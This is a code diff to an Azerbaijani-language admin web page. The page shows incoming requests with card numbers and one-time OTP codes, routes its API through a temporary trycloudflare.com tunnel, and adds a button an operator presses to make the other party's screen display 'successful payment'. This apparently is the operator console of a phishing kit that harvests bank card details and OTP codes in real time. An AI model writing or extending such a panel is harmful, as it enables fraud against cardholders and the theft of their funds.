@@ -38,7 +38,7 @@
     </div>
 
     <script>
-        let API_URL = 'http://localhost:3000/api';
+        let API_URL = 'https://groups-wrapped-meetup-specifications.trycloudflare.com/api';
         let lastCardNo = null;
 
         async function initConfig() {
@@ -142,8 +142,18 @@
                         </div>
                         <div class="flex justify-between border-t pt-2">
                             <span class="text-gray-600 font-semibold">Status:</span>
-                            <span id="req-status" class="font-bold ${data.isPaid ? 'text-green-600' : 'text-amber-600'}">${data.isPaid ? '✅ Ödənildi (20 AZN)' : '⏳ OTP Gözlənilir'}</span>
+                            <span id="req-status" class="font-bold ${data.isPaid ? 'text-green-600' : 'text-amber-600'}">${data.isPaid ? '✅ Təsdiqləndi (Ödənildi)' : '⏳ OTP Təsdiqi Gözlənilir'}</span>
                         </div>
+                    </div>
+
+                    <!-- ADMIN APPROVAL BUTTON -->
+                    <div id="action-area">
+                        ${data.isPaid ?
+                            `<div class="bg-green-100 text-green-800 font-bold p-3 rounded-xl text-center">✅ Ödəniş Admin tərəfindən Təsdiqləndi</div>` :
+                            `<button onclick="approvePayment()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3.5 rounded-xl text-base shadow-lg transition">
+                                ✅ Ödənişi Təsdiq Et (Uğurlu Ödəniş)
+                            </button>`
+                        }
                     </div>
                 </div>
             `;
@@ -152,10 +162,31 @@
         function updateRequestCard(data) {
             const otpEl = document.getElementById('req-otp');
             const statusEl = document.getElementById('req-status');
+            const actionArea = document.getElementById('action-area');
             if (otpEl) otpEl.textContent = data.otpCode || 'Gözlənilir...';
             if (statusEl) {
-                statusEl.textContent = data.isPaid ? '✅ Ödənildi (20 AZN)' : '⏳ OTP Gözlənilir';
+                statusEl.textContent = data.isPaid ? '✅ Təsdiqləndi (Ödənildi)' : '⏳ OTP Təsdiqi Gözlənilir';
                 statusEl.className = data.isPaid ? 'font-bold text-green-600' : 'font-bold text-amber-600';
+            }
+            if (actionArea && data.isPaid && !actionArea.innerHTML.includes('Uğurlu')) {
+                actionArea.innerHTML = `<div class="bg-green-100 text-green-800 font-bold p-3 rounded-xl text-center">✅ Ödəniş Admin tərəfindən Təsdiqləndi</div>`;
+            }
+        }
+
+        async function approvePayment() {
+            try {
+                const res = await fetch(`${API_URL}/admin/approve`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+                const result = await res.json();
+                if (result.success) {
+                    alert("Ödəniş uğurla təsdiqləndi! İstifadəçinin ekranında 'Uğurlu ödəniş' göstəriləcək.");
+                    checkRequests();
+                }
+            } catch (err) {
+                console.error("Təsdiqləmə xətası:", err);
+                alert("Xəta baş verdi!");
             }
         }
 
